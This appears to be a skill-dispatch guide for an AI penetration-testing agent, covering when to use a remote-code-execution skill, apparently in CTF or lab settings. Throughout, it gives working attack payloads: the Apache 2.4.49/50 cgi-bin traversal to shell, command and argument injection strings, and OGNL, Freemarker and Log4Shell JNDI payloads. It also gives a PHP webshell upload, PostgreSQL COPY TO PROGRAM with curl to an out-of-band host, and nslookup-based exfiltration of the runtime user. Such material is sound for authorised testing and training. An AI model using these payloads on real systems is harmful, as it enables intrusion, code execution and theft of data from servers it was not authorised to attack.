# rce — when to use

Dispatch the `rce` skill (agent `vulntype-rce`) when recon or a probe shows that user input can reach a code- or command-execution primitive on the server: an OS-command wrapper, a dynamic evaluator, a template/expression engine, a deserialization sink, a known-vulnerable component version, or a file-upload / URL-validation surface that feeds a shell.

## Trigger signals (dispatch the moment you observe…)

- **A vulnerable server-version banner / component fingerprint.** Treat any exact CVE-bearing version string as an RCE trigger, not an info note:
  - `Server: Apache/2.4.49` or `Apache/2.4.50` → path-traversal→RCE via `cgi-bin` (CVE-2021-41773 / 42013).
  - Struts 2 (`.action` URLs + Tomcat banner) → OGNL S2-* CVEs.
  - Log4j ≤ 2.14.1, Spring Cloud Function (SpEL), Tomcat with vulnerable AJP, a fingerprinted WordPress/CMS plugin version, or an old ImageMagick/Ghostscript/ExifTool behind an upload.
- **A parameter that is plainly a command argument / implies the server shells out.** Field or feature names like `ip_address=`, `host=`, `ip`, `cmd`, `service_name=`, `url=`, `target`, `domain`, `ping`, `nslookup`, `traceroute`, `whois`, `interface`, "test connection", `convert`, `resize`, `format`, `backup`, `archive`, `compress`, `exec`, `run` — backed by `ping`, a shell script, or `curl`. Give-away: the response echoes the input inside a command-result template ("Ping Result for <input>", `"status": ...`).
- **A leaked usage / help string in an error.** A rejected input returning `Usage: check_service.sh [-t type] [service]` means the parameter is passed to a shell program → try **argument injection** (inject a `-t`/`-c` option), not just metacharacter injection.
- **Arithmetic reflection that is EVALUATED, not echoed.** `${7*7}`, `%{7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`, or a JSON `{"script":"7*7"}` returning the *computed* `49` → expression-language / eval RCE (OGNL/SpEL for Java, `eval()` for Python/Node, SSTI engines). If it echoes `7*7` verbatim, that is reflection → XSS, not this skill.
- **A controllable timing differential.** `;sleep 5`, `` `sleep 5` ``, `|| ping -c 5 127.0.0.1`, `& timeout /t 5`, or a `sleep N` smuggled past a metachar filter via alternate syntax adds ~5s latency that disappears at baseline → blind command injection.
- **An out-of-band callback fires.** `$(curl http://OAST)`, `;nslookup x.oast`, `host=x;nslookup \`whoami\`.oast.site`, or a logged header `${jndi:ldap://OAST/a}` produces a DNS/HTTP hit on your collaborator → execution reached (and OAST DNS exfil can leak the runtime user in one shot).
- **A serialized blob crosses the wire.** Base64/raw starting with `rO0` / `\xac\xed\x00\x05` (Java `ObjectInputStream`), `H4sIA` (gzip'd Java), `AAEAAAD/////` (.NET `BinaryFormatter`), PHP `O:8:"stdClass"` / `a:2:{`, Python pickle opcodes, Ruby Marshal `\x04\x08`, or a `__VIEWSTATE` field without MAC → insecure deserialization.
- **A stack trace / banner naming a code-exec runtime.** `jinja2.exceptions`, `Twig_Error`, `freemarker.core`, `OGNL`, `SpelEvaluationException`, `eval()`/`assert()` in a PHP trace, `child_process` in a Node trace, `pickle`/`yaml.load` in a Python trace.
- **A file-upload feature where you control extension or content.** `.php`/`.phtml`/`.jsp`/`.aspx`, double/polyglot extension (`.php.jpg`, `.jpg.php`, `.pHp`), or a smuggled handler config (`.htaccess`, `web.config`, `.user.ini`) landing in a web-served/auto-loaded path → upload-to-RCE. A magic-number + extension check that still lets `image/jpeg + <?php ...>` through is the tell.
- **An already-confirmed SSRF that can reach an internal exec service.** `gopher://` to Redis/php-fpm, or reaching Jenkins/Jupyter/Spark/cloud-metadata internally → SSRF→RCE chain.
- **A confirmed SQLi with a reachable exec primitive.** `INTO OUTFILE`, `COPY ... TO PROGRAM`, `xp_cmdshell`, or UDF path → SQLi→RCE escalation.
- **A media/document/report pipeline.** Ingesting an uploaded image/PDF/SVG/DOCX or generating a PDF/report server-side (ImageMagick, Ghostscript, LibreOffice, LaTeX, Pandoc, ffmpeg, wkhtmltopdf) → out-of-process delegate RCE.
- **A 500 error on a parameter you influence, or a redirect to login only when you hit a sink file directly** — both mean you reached server-side processing that may execute given the right shape (e.g. a `wp_abspath=`-controlled include path).
- **A WordPress / CMS fingerprint.** `Link: ...rel="https://api.w.org/"`, `wp-content/plugins/<name>/`, a downloadable plugin zip, or a REST route exposing a `path`/`body`/`command`/`abilities`/`exec` argument → plugin-CVE RCE (LFI/RFI include sink such as `wp_abspath=`, or a REST run endpoint). A fingerprinted plugin CVE goes to `rce` — do not leave it on info-disclosure/source-audit agents.

## Use-case scenarios

- **Known-CVE web servers.** Version-banner-driven RCE is the cleanest win: an `Apache/2.4.49`/`2.4.50` banner immediately implies the `/cgi-bin/.%2e/.%2e/.../bin/sh` path-traversal→command-exec chain. Build the CVE-specific request rather than generic fuzzing.
- **"Utility" web tools that shell out.** Ping tools, service-status dashboards, URL/availability validators, routers, IoT dashboards, hosting/devops admin panels exposing ping/traceroute/nslookup/whois/iptables features pass user input straight into `system()`/`popen()`. Covers both the direct case (metacharacters work) and the guarded case (input validated but still passed to a program → argument injection).
- **Output-parsed command tools.** Some apps run the command, parse its output with a regex, and show only the parsed fields. Injection still works, but exfiltration must be smuggled into the expected format (e.g. wrap output to match the `... packets transmitted, ... received ...` template).
- **Java app servers.** Tomcat/Struts `.action` endpoints, OGNL/SpEL contexts: `%{7*7}`→`49` confirms, then `%{@java.lang.System@getProperty(...)}` / `%{@java.nio.file.Files@readString(...)}` reads files/env. RCE territory even when the surface looks like a message form.
- **Server-side templating with user-influenced templates.** CMS theme editors, email/notification template fields, "personalize with `{{name}}`", error-page customizers — any place a user value lands in a Jinja2/Twig/Freemarker/Velocity/Thymeleaf/Handlebars/EJS render context. Most dangerous when the user controls the template *string*, not just the data.
- **Flask/Python eval microservices.** A `/script` or `/eval` endpoint taking an expression, especially with the **Werkzeug debugger** enabled (its console is itself an RCE surface) — drive the eval to a shell and read the flag.
- **Endpoints consuming serialized objects.** Java `ObjectInputStream` over HTTP/JMS/RMI, ASP.NET ViewState / `LosFormatter`/`BinaryFormatter`, PHP `unserialize()` on cookies or PHAR-triggering file ops, Python `pickle`/`yaml.load`, Ruby Marshal. Look in cookies, hidden form fields, cache/queue payloads, API bodies.
- **File-upload image stores.** When the app advertises "we verify file structure and extension," the intended path is bypassing those checks (polyglot / double extension / handler config) to plant a webshell, then browse back to execute. Pair with the `arbitrary_file_upload` tag.
- **Logged-header injection (Log4Shell family).** Any app logging `User-Agent`/`Referer`/`X-Forwarded-For`/custom headers through a vulnerable Log4j/JNDI-capable logger.
- **Second-order chains.** SQLi-to-RCE (`INTO OUTFILE`/`TO PROGRAM`/`xp_cmdshell`) and SSRF-to-RCE (Redis/FPM/metadata) — the escalation to code execution lives in this skill.

## Concrete tells (request → response)

- **Apache CVE:** `POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` body `echo; id; cat /flag` → `200 ... uid=1(daemon) ... FLAG{...}`. Banner `Apache/2.4.50 (Unix)` in plain recon headers is the upstream tell.
- **Ping command injection (blind + output):** `POST /ping ip_address=127.0.0.1; id` → "Ping Result for ..." containing `uid=0(root)`. If raw `; id` is filtered, the output-parser variant `; echo "$(id) packets transmitted, X received, 0% packet loss"` smuggles output through the regex. Blind variant: `host=127.0.0.1;sleep 5` jumps latency ~50ms→~5050ms.
- **Service-dashboard argument injection:** `{"service_name":"apache; id"}` → `{"error":"Invalid service name"}` (metachars blocked), but `service_name="-t custom cat FLAG.txt"` → `"status":"FLAG{...}"`. The leaked `Usage: check_service.sh [-t type] [service]` reveals the option-injection path.
- **URL-validator injection:** `POST /add_url url=http://example.com"; id #` → `{"message":"URL status was checked and returned 200uid=0(root) ...","success":true}`; then `...; cat flag.txt #` returns the flag inline.
- **OGNL / Struts:** `POST /sendMessageAction.action message=%{7*7}` → `49`; then `%{@java.lang.System@getProperty("user.dir")}` → `/usr/local/tomcat`, `%{@java.nio.file.Files@readString(...get("/tmp/flag"))}` reads the flag.
- **SSTI fingerprint then confirm:** `{{7*'7'}}` → Jinja2 returns `7777777`, Twig returns `49` — the *kind* of wrong answer fingerprints the engine; `${7*7}`→`49` suggests Freemarker/Velocity/SpEL. Freemarker exec: `${"freemarker.template.utility.Execute"?new()("id")}` → `uid=...`.
- **Flask eval chain:** `/script` with `{"script":"7*7"}`/`{"script":"1+2"}` is evaluated; Werkzeug debugger present → drive eval to read `/FLAG.txt`.
- **Deserialization:** request body/cookie is base64 decoding to bytes starting `\xac\xed\x00\x05` (Java) → the endpoint deserializes untrusted input.
- **Log4Shell:** `User-Agent: ${jndi:ldap://abc.oast.site/a}` → your OAST server logs an LDAP/DNS lookup from the target's egress IP within seconds.
- **OAST DNS exfil:** `host=x;nslookup \`whoami\`.oast.site` → collaborator receives `www-data.oast.site` (confirms execution + leaks runtime user).
- **Upload → webshell:** upload JPEG-magic + `<?php system($_GET["cmd"]); ?>` as `cmd.jpg.php`/`.phtml` (or polyglot `GIF89a;<?php ...?>` named `avatar.php.jpg`); then `GET /upload/cmd.jpg.php?cmd=ls /var/www/html` returns the listing (Apache executes the last `.php` extension despite image content).
- **PostgreSQL SQLi→RCE:** `COPY (SELECT '') TO PROGRAM 'curl http://oast/$(id|tr " " .)'` → OAST hit carrying the uid.
- **WordPress plugin CVE:** `Link: <http://localhost/wp-json/>; rel="https://api.w.org/"` + downloadable `<plugin>.zip` in `wp-content/uploads`; source review shows a `wp_abspath=`-controlled include in `includes/lib/*.php`. Hitting the sink returns `500` or a redirect to `wp-login.php` — both indicate live server-side processing of the controlled path.

## When NOT to use it / easily confused with

- **A reflected value that is not evaluated is XSS, not RCE.** Only treat `{{7*7}}`/`%{7*7}`/`${7*7}` as RCE/SSTI when the response shows the *computed* `49`. Verbatim reflection → XSS.
- **Pure path traversal / LFI that only reads files is `lfi`/`path-traversal`** — unless the read leads to code execution (the Apache `cgi-bin` chain, or an include sink that runs PHP, or a *write* to an auto-loaded/executable location: cron, `.ssh`, webroot, `.user.ini`, log-poisoning into an included file). Let observed `id`/command output decide.
- **SSRF that only fetches internal URLs is `ssrf`** until it reaches an internal service that executes (then `chain-ssrf-to-rce`). A URL field that *runs a shell* to check the URL is command injection → `rce`, not plain SSRF.
- **Input reaching a SQL query but no exec primitive is the SQLi skill.** Route here only with a *confirmed* SQLi AND a reachable `INTO OUTFILE`/`TO PROGRAM`/`xp_cmdshell`/UDF path.
- **A file upload that is never re-served, or whose dir does not execute scripts, is `arbitrary_file_upload` info only** — confirm the uploaded script is reachable and executes before treating it as RCE.
- **Open redirect, header injection, CRLF are their own classes** unless the injected content lands in a code-execution sink (e.g. CRLF into a logged JNDI header).
- **A crash, 500, or timeout with no controlled behavior is not proof.** A field that errors on a quote is a hint, not a confirmed sink; do not declare RCE until a quiet oracle (timing/OAST/deterministic diff) proves code ran.
- **Sandboxed/restricted interpreters** (math-only evaluator, CSP-locked JS VM with no `require`/`process`) — note the limitation; do not over-claim host compromise from inside a sealed sandbox/container without proving boundary crossing.
- **Confirmation is not capture.** Proving RCE-as-root is not the flag. When a hint says "check environment variables," go straight to `printenv` / `/proc/self/environ`. When output is mangled by a binary prefix (polyglot upload) or a strict output parser, base64-encode the exfil — do not keep re-confirming execution.
